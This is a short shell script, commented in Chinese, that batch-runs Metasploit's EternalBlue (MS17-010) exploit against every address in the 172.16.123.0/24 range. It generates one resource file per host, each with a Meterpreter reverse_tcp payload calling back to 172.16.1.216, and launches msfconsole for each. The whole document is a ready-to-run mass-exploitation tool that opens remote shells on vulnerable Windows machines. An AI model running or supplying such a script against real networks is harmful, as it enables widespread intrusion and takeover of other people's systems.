#kali最新版可以批量跑了
mkdir /msf
for i in $(seq 255)
do
echo 'use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOSTS 172.16.123.'$i' 
set LHOST 172.16.1.216
exploit' >> /msf/172.16.123.$i.rc
gnome-terminal -e 'msfconsole -r  /msf/172.16.123.'$i'.rc'
done
